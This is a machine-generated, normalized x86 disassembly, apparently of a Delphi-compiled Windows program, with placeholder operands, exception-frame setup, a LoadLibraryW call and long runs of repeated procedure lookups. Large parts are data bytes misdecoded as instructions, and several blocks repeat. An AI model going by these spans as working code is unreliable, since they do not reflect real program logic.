mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_43fb70
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor edx edx
push ebp
push sub_43ff22
push [ fs : edx ]
mov [ fs : edx ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ff29
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
push r-xdata
call LoadLibraryW
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call sub_40bb70
mov [ rw-data ] eax
sub_440644
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_4406d0
push ecx
mov eax [ rw-data ]
cmp [ eax ] 0x6
jl r-xdata
xor eax eax
pop edx
retn
push esp
call sub_4406bc
test eax eax
jne r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov al 0x1
pop edx
retn
sub_4406f4
dec esp
pop es
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
or [ eax + eax + 0x58 ] al
pop es
inc esp
add [ ecx + 0x7 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ebp + 0xc004407 ] ch
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ edx + ecx ] dl
inc esp
add [ eax + 0x46 ] ch
inc eax
add [ eax + 0xa ] bl
inc esp
add [ edx + ecx + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
fcomp [ edx + 0x42 ]
add [ eax + eax ] al
add [ eax ] al
add eax 0x73694c46
je r-xdata
add [ edi ] al
add [ edx + 0x44004407 ] bh
add ah dh
jmp eax
add [ eax ] al
sub_4409d0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4055c0
mov dl 0x1
mov eax [ r-xdata ]
call sub_4055c0
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_440a14
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4055f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_440a58
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_430438
mov eax esi
pop esi
pop ebx
retn
sub_440a84
mov [ edx ] cl
inc esp
add [ edi ] cl
or eax 0x6c654849
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
and al 0x1c
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns sub_440a58
or eax [ eax + eax + 0xf ]
outsb
je r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xc
outsb
dec eax
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
inc ebx
outsb
je r-xdata
add al 0xdc
je r-xdata
insb
jo r-xdata
imul esp [ ebp + 0x77 ] 0xaf47265
inc esp
add [ ecx ] al
xchg bx ax
cld
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jne r-xdata
sar al 0xa
inc esp
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
add bh bh
inc [ edx ]
add [ ebx + 0x440af8c0 ] cl
or eax [ eax + eax + 0xf ]
je r-xdata
ror [ edi + 0x79 ] 0xad
jae r-xdata
jmp sub_409d9c
inc esp
and al 0x4
fsub st1
pop es
xchg ecx eax
insd
inc ebp
js r-xdata
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
outsb
je r-xdata
adc ecx [ ecx + 0x45 ]
xor al 0xb
sbb al 0x40
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx ] ah
outsb
je r-xdata
or al 0x44
add [ eax + eax ] bl
add [ eax ] al
dec esp
fadd [ eax ]
lodsb [ esi ]
push esi
inc eax
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
popad
outsb
popad
jb r-xdata
shl [ ebx + ecx + 0x44 ] 0x0
insd
dec eax
insb
jo r-xdata
outsb
je r-xdata
inc [ edx ]
add al al
or al [ eax + eax + 0xf ]
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
add al 0xdc
jmp sub_409d88
jo r-xdata
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
inc ecx
jae r-xdata
insd
and al 0x1c
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ eax - 0x2fffbfa8 ] dh
pop eax
add [ eax ] al
add [ eax + ebx * 8 + 0x40 ] cl
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax ] dl
inc ecx
jae r-xdata
nop
add [ esp + eax * 2 ] cl
add [ eax ] al
sbb al 0x40
add [ ecx ] al
add eax 0xa6b0cdb
retn
lodsd [ esi ]
add [ ecx ] al
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
imul esp [ ebp + 0x77 ] 0x1c247265
inc eax
cdq
jae r-xdata
jns r-xdata
jmp sub_442400
imul ebp [ edi + 0x6e ] 0x2400408d
or al 0x44
add al [ eax ]
add bh bh
inc [ edx ]
add [ eax + r-xdata ] dl
add [ eax ] al
jo r-xdata
cmp cl [ ecx ]
or al 0x49
dec eax
insb
jo r-xdata
add [ ebx + 0x440b74c0 ] cl
add [ edi ] cl
add bh bh
inc [ edx ]
js r-xdata
movlps [ ecx + 0x45 ] xmm1
inc esp
add [ edi ] cl
add bh bh
inc [ edx ]
add [ ebx + ecx ] dh
insb
jo r-xdata
dec eax
je r-xdata
cld
inc [ ebx - 0x23fbdbbc ]
jns r-xdata
add [ eax ] al
add eax 0xffffffd8
jmp r-xdata
je r-xdata
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44289d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
xor edx edx
call sub_4070a8
mov eax [ esi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
fsubr st1
insd
inc ebp
js r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4427ad
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lds ebx [ eax ]
add [ eax ] al
add eax 0xffffffd8
jmp r-xdata
jo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4428a4
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
inc eax
xor ebx ebx
mov eax [ esi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ esi + 0x20 ]
mov edx ebx
call sub_4070a8
add eax 0xffffffd8
jmp r-xdata
imul ebp [ edi + 0x6e ] r-xdata
loopne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
jmp r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_44297f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
add [ edi ] al
adc al 0x45
dec eax
insb
jo r-xdata
outsb
lea eax [ eax ]
and al 0xc
inc esp
inc eax
add [ eax ] al
add [ ecx ] cl
dec eax
insb
jo r-xdata
mov eax [ esi + 0x14 ]
mov edx ebx
call sub_4305a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_409ccc
lea eax [ ebp - 0x8 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_418a80
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4427b4
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
inc eax
xor ebx ebx
mov eax [ edi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
add eax 0xffffffd8
jmp r-xdata
outsb
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442986
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
inc ebx
xor esi esi
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4426a1
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
add eax 0xffffffd8
jmp r-xdata
jae r-xdata
mov eax [ esi + 0x14 ]
mov edx ebx
call sub_4305a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_409ccc
lea eax [ ebp - 0x8 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_418a80
test al al
je r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x48 ]
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44263a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x20
mov edx ebx
call sub_4070a8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4423dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x19 ] 0x0
test ebx ebx
je r-xdata
add [ eax ] al
add [ edx ] al
add ah cl
add eax 0xffffffdc
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx esi
call sub_4305a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_409ccc
lea eax [ ebp - 0x8 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_418a80
test al al
je r-xdata
inc esi
dec ebx
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4418ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442641
mov eax [ ebp - 0x10 ]
call sub_4055f0
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x20
mov edx ebx
call sub_4070a8
mov eax [ eax + 0x1c ]
retn
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4423e4
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x18 ]
call sub_4305a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_409ccc
xor eax eax
push ebp
push sub_4423ac
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_418a80
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_4305a0
mov ebx eax
lea eax [ ebp - 0x4 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebx + 0x4 ]
call sub_418a80
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov [ ebp - 0x19 ] al
xor edx edx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x11 ] 0x1
call sub_4061a4
jmp r-xdata
retn
movzx edx [ ebp - 0x19 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
sub_440b91
int1
sbb al 0xd1
xchg ebp eax
cmp [ esi + 0x9 ] bl
dec eax
insb
jo r-xdata
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ esi ] dl
inc ecx
add [ eax + 0x58004166 ] bh
inc cx
outsb
je r-xdata
add al 0xdc
je r-xdata
add [ eax * 2 + 0x706c6548 ] dl
push ebx
jns r-xdata
inc ecx
jae r-xdata
jmp sub_409d9c
inc esp
and al 0x4
fsub st1
pop es
xchg ecx eax
insd
inc ebp
js r-xdata
add al [ eax ]
nop
add [ esp + eax * 2 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
or al 0x44
add [ eax + eax ] bl
add [ eax ] al
dec esp
fadd [ eax ]
lodsb [ esi ]
push esi
inc eax
add [ esi + edx * 2 + 0x67100040 ] dh
inc ecx
add [ eax - 0x2fffbfa8 ] dh
pop eax
add bh bh
inc [ edx ]
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0xc
add al 0xdc
jmp sub_409d88
jo r-xdata
jmp sub_442400
imul ebp [ edi + 0x6e ] 0x2400408d
or al 0x44
cld
inc [ ebx - 0x23fbdbbc ]
jns r-xdata
add [ eax ] al
add eax 0xffffffd8
jmp r-xdata
je r-xdata
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44289d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
xor edx edx
call sub_4070a8
mov eax [ esi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
fsubr st1
insd
inc ebp
js r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_4427ad
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lds ebx [ eax ]
add [ eax ] al
add eax 0xffffffd8
jmp r-xdata
jo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4428a4
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
inc eax
xor ebx ebx
mov eax [ esi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ esi + 0x20 ]
mov edx ebx
call sub_4070a8
add eax 0xffffffd8
jmp r-xdata
imul ebp [ edi + 0x6e ] r-xdata
loopne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
jmp r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_44297f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
add [ edi ] al
adc al 0x45
dec eax
insb
jo r-xdata
outsb
lea eax [ eax ]
and al 0xc
inc esp
inc eax
add [ eax ] al
add [ ecx ] cl
dec eax
insb
jo r-xdata
mov eax [ esi + 0x14 ]
mov edx ebx
call sub_4305a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_409ccc
lea eax [ ebp - 0x8 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_418a80
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4427b4
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
inc eax
xor ebx ebx
mov eax [ edi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
add eax 0xffffffd8
jmp r-xdata
outsb
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442986
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
inc ebx
xor esi esi
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4426a1
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
add eax 0xffffffd8
jmp r-xdata
jae r-xdata
mov eax [ esi + 0x14 ]
mov edx ebx
call sub_4305a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_409ccc
lea eax [ ebp - 0x8 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_418a80
test al al
je r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov esi [ eax ]
call [ esi + 0x48 ]
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44263a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
